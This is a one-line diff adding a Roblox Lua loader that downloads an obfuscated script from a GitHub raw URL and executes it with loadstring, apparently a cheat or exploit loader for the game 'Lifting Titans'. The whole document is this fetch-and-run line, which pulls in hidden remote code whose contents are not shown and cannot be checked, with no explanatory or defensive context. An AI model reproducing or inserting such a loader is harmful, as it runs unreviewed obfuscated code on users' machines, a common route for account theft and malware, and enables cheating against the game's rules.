@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/zekgt/Lifting_Titans/main/Obfuscated.lua"))()
